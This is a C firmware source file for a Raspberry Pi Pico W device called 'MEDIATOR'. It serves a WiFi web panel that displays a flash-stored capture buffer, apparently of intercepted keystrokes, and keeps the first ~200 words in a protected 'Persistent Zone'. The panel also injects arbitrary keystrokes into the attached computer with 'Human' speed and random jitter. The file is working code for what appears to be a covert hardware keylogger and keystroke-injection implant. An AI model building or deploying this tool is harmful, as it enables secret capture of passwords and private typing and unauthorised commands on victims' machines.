#include "wifi_server.h"
#include "pico/stdlib.h"
#include "pico/cyw43_arch.h"
#include "lwip/tcp.h"
#include "pico/time.h"
#include "capture.h"
#include "inject.h"

#ifndef WIFI_SSID
#define WIFI_SSID     "REDACTED_SSID"
#endif
#ifndef WIFI_PASSWORD
#define WIFI_PASSWORD "REDACTED_PASSWORD"
#endif

static struct tcp_pcb *http_pcb;

static const char HTML_HEAD[] =
"HTTP/1.1 200 OK\r\n"
"Content-Type: text/html; charset=utf-8\r\n"
"Connection: close\r\n\r\n"
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>MEDIATOR</title>"
"<style>"
"body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:16px}"
"button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px;cursor:pointer;border-radius:6px}"
"button:hover{background:#30363d}"
"pre{background:#000;padding:14px;border:1px solid #30363d;border-radius:6px;overflow:auto;min-height:100px;white-space:pre-wrap}"
".bar{margin-bottom:12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}"
".section{margin-bottom:20px}"
".persist-hdr{color:#f0b429;font-size:.8rem;margin-bottom:4px}"
"</style></head><body>"
"<h2 style='margin-bottom:16px'>MEDIATOR Capture</h2>"
"<div class='section'>"
"<div class='bar'>"
"<span style='color:#f0b429;font-weight:bold'>&#128274; Persistent Zone</span>"
"<small style='color:#8b949e'>First ~200 words &mdash; never auto-erased</small>"
"<form method='POST' action='/clearpersist' style='margin-left:auto'>"
"<button type='submit' style='background:#5a1e1e;border-color:#8b2a2a;color:#ffa0a0'>Clear Persistent</button>"
"</form></div>"
"<pre>";

// Inserted between persistent pre and circular pre
static const char HTML_MID[] =
"</pre></div>"
"<div class='section'>"
"<div class='bar'>"
"<span style='color:#58a6ff;font-weight:bold'>&#128190; Capture Buffer (512 KB circular)</span>"
"<button onclick='location.reload()' style='margin-left:auto'>Refresh</button>"
"<form method='POST' action='/clear' style='display:inline'>"
"<button type='submit'>Erase Flash</button>"
"</form></div>"
"<pre>";

static const char HTML_TAIL[] =
"</pre>"
"<br><h3>Inject Keystrokes</h3>"
"<textarea id='i_t' rows='4' style='width:100%;background:#000;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:10px'></textarea><br>"
"<div style='margin-top:12px;margin-bottom:8px;color:#8b949e;font-size:.85rem'>Speed:</div>"
"<div style='display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px'>"
"<button id='spd10'  onclick='setSpd(10)'  style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>10ms<br><small style='color:#8b949e'>Blazing</small></button>"
"<button id='spd50'  onclick='setSpd(50)'  style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>50ms<br><small style='color:#8b949e'>Fast</small></button>"
"<button id='spd100' onclick='setSpd(100)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>100ms<br><small style='color:#8b949e'>Normal</small></button>"
"<button id='spd200' onclick='setSpd(200)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>200ms<br><small style='color:#8b949e'>Slow</small></button>"
"<button id='spd300' onclick='setSpd(300)' style='flex:1;padding:10px 4px;border-radius:6px;text-align:center'>300ms<br><small style='color:#8b949e'>Human</small></button>"
"</div>"
"<label style='margin-bottom:12px;display:block'><input type='checkbox' id='i_j' checked> Jitter (random variation)</label>"
"<button onclick='doType()' style='width:100%;padding:12px;font-size:1rem;background:#238636;border:1px solid #2ea043;color:#fff;border-radius:6px;cursor:pointer'>Type It!</button>"
"<script>"
"var S=50;"
"function setSpd(v){"
"S=v;"
"['10','50','100','200','300'].forEach(function(x){"
"var b=document.getElementById('spd'+x);"
"b.style.background=(x==v)?'#1f6feb':'#21262d';"
"b.style.borderColor=(x==v)?'#58a6ff':'#30363d';"
"});"
"}"
"function doType(){"
"var t=document.getElementById('i_t').value;"
"if(!t){alert('Enter text first!');return;}"
"fetch('/type?s='+S+'&j='+(document.getElementById('i_j').checked?1:0),{method:'POST',body:t})"
".then(function(){alert('Typing '+t.length+' chars at '+S+'ms each!');});"
"}"
"setSpd(50);"
"</script>"
"</body></html>";


static const char RESP_REDIRECT[] = "HTTP/1.1 303 See Other\r\nLocation: /\r\nConnection: close\r\n\r\n";
static const char RESP_OK[]       = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK";
static const char RESP_404[]      = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";

static void http_err(void *arg, err_t err) {
    (void)arg; (void)err;
}

static void http_close(struct tcp_pcb *tpcb) {
    tcp_arg(tpcb, NULL);
    tcp_sent(tpcb, NULL);
    tcp_recv(tpcb, NULL);
    tcp_err(tpcb, NULL);
    tcp_poll(tpcb, NULL, 0);
    tcp_close(tpcb);
}

static err_t http_sent(void *arg, struct tcp_pcb *tpcb, u16_t len) {
    (void)arg; (void)len;
    if (tcp_sndbuf(tpcb) == TCP_SND_BUF) {
        http_close(tpcb);
    }
    return ERR_OK;
}

// Persistent accumulation buffer — survives across multiple tcp recv callbacks
// for the same connection (large POST bodies span multiple TCP segments).
static char     req_buf[16384];       // raw bytes accumulated so far
static uint32_t req_accumulated = 0;  // bytes in req_buf
static struct tcp_pcb *req_pcb = NULL;// connection we are accumulating for

static err_t http_recv(void *arg, struct tcp_pcb *tpcb, struct pbuf *p, err_t err) {
    (void)arg;
    if (!p) { http_close(tpcb); return ERR_OK; }
    tcp_recved(tpcb, p->tot_len); // ACK bytes immediately (flow control)

    // New connection → reset accumulation
    if (tpcb != req_pcb) {
        req_accumulated = 0;
        req_pcb = tpcb;
    }

    // Append this chunk to accumulation buffer
    uint32_t space    = (uint32_t)(sizeof(req_buf) - 1) - req_accumulated;
    uint32_t copy_len = (p->tot_len < space) ? p->tot_len : space;
    pbuf_copy_partial(p, req_buf + req_accumulated, (uint16_t)copy_len, 0);
    req_accumulated += copy_len;
    req_buf[req_accumulated] = '\0';
    pbuf_free(p);

    // Wait until we have the complete HTTP headers
    char *body_start = strstr(req_buf, "\r\n\r\n");
    if (!body_start) return ERR_OK; // need more data

    body_start += 4; // skip blank line

    // For POST requests: wait until we have all Content-Length bytes in body
    uint32_t content_length = 0;
    char *cl = strstr(req_buf, "\r\nContent-Length: ");
    if (!cl) cl = strstr(req_buf, "\r\ncontent-length: "); // some clients lowercase
    if (cl) content_length = (uint32_t)atoi(cl + 18);

    uint32_t header_len   = (uint32_t)(body_start - req_buf);
    uint32_t body_received = req_accumulated - header_len;

    if (body_received < content_length) return ERR_OK; // need more data

    // ---- Complete request received — process it ----
    char    *req     = req_buf;
    uint32_t req_len = req_accumulated;

    if (req_len >= 5 && strncmp(req, "GET /", 5) == 0) {
        tcp_write(tpcb, HTML_HEAD, sizeof(HTML_HEAD) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        capture_stream_persist_to_tcp(tpcb);
        tcp_write(tpcb, HTML_MID, sizeof(HTML_MID) - 1, TCP_WRITE_FLAG_COPY | TCP_WRITE_FLAG_MORE);
        capture_stream_to_tcp(tpcb);
        tcp_write(tpcb, HTML_TAIL, sizeof(HTML_TAIL) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 18 && strncmp(req, "POST /clearpersist", 18) == 0) {
        capture_clear_persist();
        tcp_write(tpcb, RESP_REDIRECT, sizeof(RESP_REDIRECT) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 12 && strncmp(req, "POST /clear ", 12) == 0) {
        capture_clear();
        tcp_write(tpcb, RESP_REDIRECT, sizeof(RESP_REDIRECT) - 1, TCP_WRITE_FLAG_COPY);
    } else if (req_len >= 11 && strncmp(req, "POST /type?", 11) == 0) {
        uint32_t speed = 50;
        bool     jitter = true;
        char    *url = req + 11;

        char *s_ptr = strstr(url, "s=");
        if (s_ptr) speed = (uint32_t)atoi(s_ptr + 2);
        char *j_ptr = strstr(url, "j=");
        if (j_ptr) jitter = atoi(j_ptr + 2) ? true : false;

        if (body_received > 0) {
            inject_start(body_start, body_received, speed, jitter);
        }
        tcp_write(tpcb, RESP_OK, sizeof(RESP_OK) - 1, TCP_WRITE_FLAG_COPY);
    } else {
        tcp_write(tpcb, RESP_404, sizeof(RESP_404) - 1, TCP_WRITE_FLAG_COPY);
    }

    // Reset accumulation for next request
    req_accumulated = 0;
    req_pcb = NULL;

    tcp_output(tpcb);
    if (tcp_sndbuf(tpcb) == TCP_SND_BUF) {
        http_close(tpcb);
    }
    return ERR_OK;
}

static err_t http_accept(void *arg, struct tcp_pcb *newpcb, err_t err) {
    (void)arg;
    if (err != ERR_OK || !newpcb) return ERR_VAL;
    tcp_recv(newpcb, http_recv);
    tcp_sent(newpcb, http_sent);
    tcp_err(newpcb, http_err);
    return ERR_OK;
}

static bool wifi_connected = false;
static uint32_t last_connect_attempt = 0;

void wifi_server_init(void) {
    if (cyw43_arch_init()) {
        printf("cyw43_arch_init failed\n");
        return;
    }
    
    cyw43_arch_enable_sta_mode();
    
    // Start TCP server immediately
    http_pcb = tcp_new();
    if (http_pcb) {
        tcp_bind(http_pcb, IP_ANY_TYPE, 80);
        http_pcb = tcp_listen(http_pcb);
        tcp_accept(http_pcb, http_accept);
    }
    
    // Kick off first async connection attempt
    cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
    last_connect_attempt = to_ms_since_boot(get_absolute_time());
}

void wifi_server_task(void) {
    cyw43_arch_poll();

    uint32_t now = to_ms_since_boot(get_absolute_time());

    if (!wifi_connected) {
        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);

        if (status == CYW43_LINK_UP) {
            // L2 up — also verify DHCP gave us an IP
            if (cyw43_state.netif[CYW43_ITF_STA].ip_addr.addr != 0) {
                wifi_connected = true;
            }
        }

        // Retry if:
        //  - hard failure (status < 0), OR
        //  - stuck in JOIN/NOIP for more than 15 s (hotspot was slow to assign IP)
        if (!wifi_connected && (status < 0 || (now - last_connect_attempt > 15000))) {
            cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
            last_connect_attempt = now;
        }
    } else {
        // Monitor for connection loss (hotspot turned off)
        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);
        if (status != CYW43_LINK_UP) {
            wifi_connected = false;
            cyw43_arch_wifi_connect_async(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK);
            last_connect_attempt = now;
        }
    }
}
